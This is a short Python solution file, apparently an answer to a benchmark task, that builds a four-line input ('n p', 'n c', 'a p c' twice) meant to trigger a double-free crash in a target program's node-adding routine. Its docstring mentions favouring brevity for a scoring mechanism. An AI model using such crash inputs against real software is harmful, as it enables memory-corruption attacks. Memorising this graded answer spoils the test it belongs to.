import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a double-free caused by an exception in `Node::add`.
        This suggests an invalid operation after a valid one creates a state
        where two entities "own" the same resource.

        The PoC follows this logic:
        1. Create a parent node 'p'.
        2. Create a child node 'c'.
        3. Add 'c' to 'p'. This succeeds and establishes a parent-child link.
           Now, the parent's destructor will likely free the child, but the
           child also exists in a global node list.
        4. Add 'c' to 'p' again. This is an invalid operation (e.g., child
           already has a parent) and is expected to throw an exception.
        5. The exception leads to cleanup where both the parent's destructor
           and the global list's destructor attempt to free 'c', causing a
           double-free.

        Short command names ('n', 'a') and node names are used to produce a
        concise PoC, which is favored by the scoring mechanism.
        """
        
        # Commands to set up the state and trigger the vulnerability.
        poc_lines = [
            b"n p",        # Create a parent node named 'p'
            b"n c",        # Create a child node named 'c'
            b"a p c",      # Add 'c' to 'p'. This should succeed.
            b"a p c",      # Add 'c' to 'p' again. This should fail and throw.
        ]

        # Join the commands with newlines and add a trailing newline.
        # The trailing newline ensures that line-buffered input streams process
        # the final command.
        return b"\n".join(poc_lines) + b"\n"
